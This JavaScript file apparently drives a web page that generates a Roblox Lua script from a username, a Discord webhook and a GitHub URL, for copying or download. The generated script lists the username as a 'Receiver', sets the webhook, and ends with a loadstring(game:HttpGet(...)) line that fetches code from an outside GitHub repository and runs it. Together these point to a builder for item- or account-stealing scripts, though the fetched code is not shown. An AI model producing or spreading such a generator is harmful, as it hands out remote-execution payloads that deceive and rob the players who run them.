function switchToHelp() {
  document.getElementById('scriptPage').classList.remove('active');
  document.getElementById('helpPage').classList.add('active');
}

function switchToScript() {
  document.getElementById('helpPage').classList.remove('active');
  document.getElementById('scriptPage').classList.add('active');
}

// Existing script logic
document.getElementById('scriptForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const github = document.getElementById('github').value.trim();
  const webhook = document.getElementById('webhook').value.trim();

  if (!github.startsWith("https://raw.githubusercontent.com/") || !webhook.startsWith("https://discord.com/api/webhooks/")) {
    alert("Please enter valid raw GitHub and Discord webhook URLs.");
    return;
  }

  const luaScript = `
Config = {
  Receivers = {"${username}"},
  Webhook = "${webhook}",
  ScriptURL = "${github}",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
`.trim();

  const output = document.getElementById("output");
  const scriptBox = document.getElementById("scriptBox");
  scriptBox.textContent = luaScript;
  output.classList.remove("hidden");

  // Copy button
  document.getElementById("copyBtn").onclick = function () {
    navigator.clipboard.writeText(luaScript);
    alert("Copied to clipboard!");
  };

  // Download button
  document.getElementById("downloadBtn").onclick = function () {
    const blob = new Blob([luaScript], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "generated_script.lua";
    a.click();
    URL.revokeObjectURL(url);
  };
});